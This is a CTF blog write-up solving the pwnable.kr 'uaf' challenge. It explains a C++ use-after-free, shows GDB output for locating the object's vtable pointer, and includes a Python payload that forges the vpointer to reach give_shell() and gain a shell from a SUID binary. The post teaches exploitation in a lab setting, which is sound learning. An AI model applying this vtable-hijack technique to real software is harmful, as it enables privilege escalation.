Title: Pwnable.kr uaf 
Date: 2020-10-24 3:30 PM 
Category: CTF 

In this post, I'm going to walk through my solution to the "UAF" challenge from pwnables.kr, a pretty cool wargame site run by the SSLab at Georgia Tech. I picked out this challenge because I was interested in learning more about C++ exploitation, and right off the bat it was clear that this challenge would fit the bill. UAF, stands for "use-after-free", so can be pretty sure that we'll be taking advantage of a use-after-free vulnerability here. I won't go into too much detail about UAFs, as there are plenty of good resources online already. For this challenge, you are given the ssh credentials to a remote server: 

```
:::console
$ ssh uaf@pwnable.kr -p2222
uaf@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

...
uaf@pwnable:~$ ls -lah
total 44K
drwxr-x---   5 root uaf     4.0K Oct 23  2016 .
drwxr-xr-x 116 root root    4.0K Apr 17  2020 ..
d---------   2 root root    4.0K Sep 21  2015 .bash_history
-rw-r-----   1 root uaf_pwn   22 Sep 26  2015 flag
dr-xr-xr-x   2 root root    4.0K Sep 21  2015 .irssi
drwxr-xr-x   2 root root    4.0K Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root uaf_pwn  16K Sep 26  2015 uaf
-rw-r--r--   1 root root    1.4K Sep 26  2015 uaf.cpp
```

First, we can see that the flag file is only readable by root and members of the uaf_pwn group. Second, the uaf binary is an SUID binary (as indicated by the 's' instead of an 'x' in the "all users" permissions group). This means that when any user executes the uaf binary, it will be executed with the file system permissions of the file owner - root in this case. Therefore, if we can get a shell in the context of the uaf process (which will be running with root permissions), we'll be able to read out the flag file. Lucky for us, the source code is provided:

```
:::c++
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
      	this->name = name;
       	this->age = age;
    }
    virtual void introduce(){
       	Human::introduce();
        cout << "I am a nice guy!" << endl;
    }
};

class Woman: public Human{
public:
    Woman(string name, int age){
        this->name = name;
        this->age = age;
    }
    virtual void introduce(){
        Human::introduce();
        cout << "I am a cute girl!" << endl;
    }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

This program simply spins in an infinite while loop and prompts the user for option 1,2, or 3 - each of which cause the program to take a different action. It also takes two arguments: First an ingeter that will be used as the number of bytes to be allocated in option 2, and second, the path to a file whose contents will be read and written at the newly allocated memory.

The problem in this code is pretty apparent: two objects are created, which can then be deleted by the user (option 3), leaving behind two dangling pointers `m` and `w`. When option 1 is taken after deleting the objects with option 3, the program attempts to call `introduce()` on these two nonexistent objects. In other words, option 3 followed by option 1 will likely cause a segmentation fault as the `m` and `w` objects no longer exist.

Let's do a little digging and figure out exactly how these C++ objects are represented in memory. What follows is an annotated GDB session that details my process for reverse engineering the uaf program at a binary level (note bracketed annotations).

```
:::console
$ gdb uaf
...
[1] gef➤  set print asm-demangle
gef➤  disas
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:	push   rbp
   0x0000000000400ec5 <+1>:	mov    rbp,rsp
=> 0x0000000000400ec8 <+4>:	push   r12
   0x0000000000400eca <+6>:	push   rbx
   0x0000000000400ecb <+7>:	sub    rsp,0x50
   0x0000000000400ecf <+11>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400ed2 <+14>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:	lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:	mov    rdi,rax
   0x0000000000400edd <+25>:	call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400ee2 <+30>:	lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:	lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:	mov    esi,0x4014f0
   0x0000000000400eef <+43>:	mov    rdi,rax
   0x0000000000400ef2 <+46>:	call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400ef7 <+51>:	lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:	mov    edi,0x18
   0x0000000000400f00 <+60>:	call   0x400d90 <operator new(unsigned long)@plt>
[2]   0x0000000000400f05 <+65>:	mov    rbx,rax
...
[3] gef➤  b *0x0000000000400f05
Breakpoint 2 at 0x400f05a
gef➤  c
Continuing.
...
Breakpoint 2, 0x0000000000400f05 in main ()
[4] gef➤  i r $rax
rax            0x614ea0	0x614ea0
gef➤  c
Continuing.
1. use
2. after
3. free
[5] ^C
[6] gef➤  x/5gx 0x614ea0
0x614ea0:	0x0000000000401570	0x0000000000000019
0x614eb0:	0x0000000000614e88	0x0000000000000031
0x614ec0:	0x0000000000000004
[7] gef➤  info symbol 0x0000000000401570
vtable for Man + 16 in section .rodata of /home/dev/Documents/ctf/uaf/uaf
[8] gef➤  x/s 0x0000000000614e88
0x614e88:	"Jack"
[9] gef➤  x/2a 0x0000000000401570
0x401570 <vtable for Man+16>:	0x40117a <Human::give_shell()>	0x4012d2 <Man::introduce()>
```

[1] First, tell gdb to demangle C++ symbols. This makes debugging much easier.

[2] I then located the first instruction following the "new" call with the goal of ascertaining the memory location at which the `m` object will be allocated on the heap.

[3] Set a breakpoint at the address discovered in [2]

[4] Get the return value of the new operator - 0x614ea0 in this case. This is where the m object will exist in memory.

[5] Skip ahead to a point where the `m` object is fully constructed and ctrl-c to break back to the debugger session.

[6] Examine 5 giant words (giant word = 8 bytes) in hex of the object memory.

[7] The first 8 bytes of the object are its vpointer, pointing to its vtable (see the following discussion on vtables). Also note that the second 8 bytes are 0x19, or 25 in decimal. This corresponds to the "age" protected data member and is 25 in this case as we would expect for this object.

[8] The third 8-bytes point to the string "Jack", corresponding to the "name" data member of the object.

[9] Finally, print out two pointers at object's vtable. We can see that the object has two member virtual functions: `give_shell()` and `introduce()`.

In step [7], we located the `m` object's vpointer. I won't go into too much discussion about how C++ objects work at the binary level since there is already lots of good reading out there on the web, but suffice it to say that the addresses of virtual functions are stored in a table unique to that object type. This technique enables run-time polymorphism, where the compiler does not know the address of a virtual function call because it could be the base class implementation, or any of if its derived classes. Instead, addresses to virtual functions are looked up at runtime (known as run-time method binding). 

At this point, we have discovered the binary representation of the m object. To visualize:

```
:::console
Man object m                vtable
|--------------------| 	    |--------------------------|
| vpointer (0x401570)|----->| function ptr1 (0x40117a) |----> Human::give_shell()
|--------------------|      |--------------------------|
| age (0x19)	     |	    | function ptr2 (0x4012d2) |----> Man::introduce()
|--------------------|	    |--------------------------|
| name (0x614e88)    |--|
|--------------------|  |
						|--> "Jack"

```

For the program to make a call to the `introduce()` function, it must lookup the address in that objects vtable. Therefore, the address of the `introduce()` function will be computed as vpointer+8.

So, to exploit this program, we simply need to create a "fake" man object at the spot in memory where the dangling `m` object pointer points. This is possible because option 2 gives us full control over the data to be written to the newly allocated array, as provided to the program by a file. The goal will be to get the program to execute the `give_shell()` function, and since we know that a call to `introduce()` will consult the second entry of the object's vtable, we simply need to set up the fake object to have a vpointer of 0x401568 (original vpointer minus 8) then force the program to make an `m->introduce()` call (option 1). The memory representation of our fake object is illustrated below:

```
:::console                  vtable
						    |--------------------------|
Fake man object			|-->| UNKNOWN DATA             |
|--------------------|  |   |--------------------------|
| vpointer (0x401568)|---   | function ptr1 (0x40117a) |----> Human::give_shell()
|--------------------|      |--------------------------|
| age (0x19)	     |	    | function ptr2 (0x4012d2) |----> Man::introduce()
|--------------------|	    |--------------------------|
| name (0x614e88)    |--|
|--------------------|  |
						|--> "Jack"
```
Let's make sure we can force this program to allocate memory at the address of the original `m` object, which we learned above was 0x614ea0. We'll try deleting the `m` and `w` objects using option 3. I'll use 24 as the argument to the program because that's how many bytes are allocated for the original `m` object by the program itself.

```
:::console
gef➤  b *0x00401025
Breakpoint 4 at 0x401025
gef➤  run e
Starting program: /home/dev/Documents/ctf/uaf/uaf 24 e
1. use
2. after
3. free
3
1. use
2. after
3. free
2
...
Breakpoint 4, 0x0000000000401025 in main ()
gef➤  i r $rax
rax            0x614ef0	0x614ef0
```

The char array was allocated at address 0x614ef0... not what we want. Let's try again:

```
:::console
gef➤  c
Continuing.
your data is allocated
1. use
2. after
3. free
2
...
Breakpoint 4, 0x0000000000401025 in main ()
gef➤  i r $rax
rax            0x614ea0	0x614ea0
```

There we go! That's the address we want. Now that we know we can allocate memory at address 0x614ea0 *and* we have full control over what gets written there, we simply need to write our fake object bytes to a file. Really, our fake object just consists of the vpointer - the age and name fields are irrelevant. I used python to write these as raw bytes to a file (note the little endian byte ordering):

```
:::python3
with open("e", "wb") as f:
    f.write(b'\x68\x15\x40\x00\x00\x00\x00\x00')
```

Now exploit:

```
:::console
$ ./uaf 24 e
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ ls
e  flag  uaf  uaf.cpp 
$ 
```

Boom! We have a shell in the uaf process. Since uaf is a SUID binary, it's running as root, meaning we can now use this shell to read out the flag file. That's all there is to it.
